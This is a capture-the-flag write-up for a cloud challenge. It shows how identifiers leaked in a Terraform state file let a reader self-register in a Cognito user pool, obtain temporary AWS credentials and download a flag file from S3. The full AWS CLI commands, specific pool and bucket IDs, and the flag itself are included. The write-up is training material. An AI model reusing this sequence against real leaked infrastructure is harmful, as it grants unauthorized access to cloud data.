**Title**: Make It Rain  
**Category**: Misc

---

## **Problem Statement**

We built secure vault to store our secret flag but somehow got the blueprint of the vault leaked. Can you help us to retrieve the secret flag from the vault?

`Author: _jungbahadurrana`

Attachment:
- [terraform.tfstate](files/terraform.tfstate)
 
---

## **Solution**

In this challenge, we are given a Terraform state file `.tfstate` file. A `.tfstate` file is created on running terraform apply and contains current state of Terraform-managed infrastructure for tracking changes. On analyzing the file I found some useful information like Cognito Identity Pool, IAM roles, S3 bucket etc. 

The region `us-east-1` is specified in the Identity Pool. Let's configure AWS CLI with this region. For now, leave other fields empty.

```sh
aws configure
```

Now we will use this Cognito User Pool to sign up as a user. Using the `client_id` (`4bjmgsip08ah118ugkau5p946b`) will create a user in their user pool.

```sh
aws cognito-idp sign-up --client-id 4bjmgsip08ah118ugkau5p946b --username <your-username> --password <your-password> --user-attributes Name=email,Value=<your-email>
```

Next, we authenticated the user to get the ID token.

```sh
aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id 4bjmgsip08ah118ugkau5p946b --auth-parameters USERNAME=<your-username>,PASSWORD=<your-password>
```

With this ID token, we can made a request to Cognito to obtain temporary AWS credentials using the `provider-name` (`cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L`). First, we’ll get the identity ID.

```sh
aws cognito-identity get-id --identity-pool-id us-east-1:b73a3094-c689-47e2-b9c4-311d5b7ee1ee --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L=<your-id-token>
```

Then, use this ID to to obtain temporary credentials. 

```sh
aws cognito-identity get-credentials-for-identity --identity-id <identity-id> --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L=<your-id-token>
```

This returns `AccessKeyId`, `SecretAccessKey`, and `SessionToken`. These credentials are associated with the IAM role (`CognitoS3Role`) that has permission to access S3 bucket.

Now, we will configure the AWS CLI to use these temporary credentials.

```sh
export AWS_ACCESS_KEY_ID=<your-access-key-id>
export AWS_SECRET_ACCESS_KEY=<your-secret-access-key>
export AWS_SESSION_TOKEN=<your-session-token>
```

With the temporary credentials set, we will now retrieve the `flag.txt` from S3 bucket.

```sh
aws s3 cp s3://patriot-ctf-cloud-ctf-challenge/flag.txt .
```

So, our final flag is `PCTF{G14d_th4T_y0u_tR13d!}`.
